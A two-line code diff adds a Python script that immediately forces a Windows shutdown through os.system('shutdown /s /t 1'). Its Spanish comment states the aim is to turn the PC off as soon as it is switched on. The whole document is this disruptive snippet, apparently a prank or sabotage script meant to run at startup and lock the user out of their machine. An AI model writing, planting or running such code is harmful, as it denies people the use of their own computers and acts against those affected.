@@ -1,0 +1,2 @@
+import os
+os.system("shutdown /s /t 1")  # para apagar pc ni bien la prende
